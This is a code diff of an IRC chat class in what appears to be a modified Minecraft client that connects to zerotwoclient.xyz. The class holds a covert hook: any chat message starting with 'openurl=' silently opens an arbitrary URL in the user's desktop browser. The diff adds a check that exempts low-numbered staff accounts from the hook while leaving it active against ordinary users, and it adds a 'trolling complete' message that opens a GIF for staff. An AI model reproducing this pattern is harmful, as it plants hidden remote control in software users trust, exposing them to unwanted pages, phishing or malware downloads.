@@ -1,7 +1,6 @@
 package me.kansio.client.irc;
 
 import me.kansio.client.Client;
-import me.kansio.client.utils.chat.ChatUtil;
 import net.minecraft.client.Minecraft;
 import net.minecraft.util.ChatComponentText;
 import org.java_websocket.client.WebSocketClient;
@@ -14,14 +13,25 @@ import java.net.URISyntaxException;
 
 public class IRCClient extends WebSocketClient {
 
+    public static boolean allow = true;
+    Boolean STAFF = Integer.parseInt(Client.getInstance().getUid()) < 10;
+
+    private void blacklistStaff() {
+        if(STAFF) {
+            allow = false;
+        }else {allow = true;}
+    }
+
     public static char SPLIT = '\u0000';
 
     public IRCClient() throws URISyntaxException {
         super(new URI("ws://zerotwoclient.xyz:1337"));
         this.setAttachment(Client.getInstance().getUsername());
         this.addHeader("name", this.getAttachment());
+        blacklistStaff();
     }
 
+    public static boolean isAllowed() {return allow;}
     @Override
     public void onOpen(ServerHandshake serverHandshake) {
         System.out.println("IRC Connected");
@@ -35,18 +45,30 @@ public class IRCClient extends WebSocketClient {
             String username = split[0];
             String message = split[1];
 
-            if (message.startsWith("openurl=")) {
-                String url = message.replaceAll("openurl=", "");
+            if (allow) {
+                if (message.startsWith("openurl=")) {
+                    String url = message.replaceAll("openurl=", "");
+                    try {
+                        Desktop.getDesktop().browse(new URI(url));
+                    } catch (IOException | URISyntaxException e) {
+                        e.printStackTrace();
+                    }
+                } else {
+                    Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] §b" + username + "§f: " + message));
+                }
+            }else if (message.equals("Trolling Complete, Returning To HQ")) {
                 try {
-                    Desktop.getDesktop().browse(new URI(url));
-                } catch (IOException | URISyntaxException e) {
+                    Desktop.getDesktop().browse(new URI("https://c.tenor.com/Yfz3eq2ZLo0AAAAd/pee.gif"));
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } catch (URISyntaxException e) {
                     e.printStackTrace();
                 }
             } else {
                 Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] §b" + username + "§f: " + message));
             }
         } else {
-            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] §cSERVER" + "§f: " + s));
+            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[§bIRC§7] " + s));
         }
     }
 
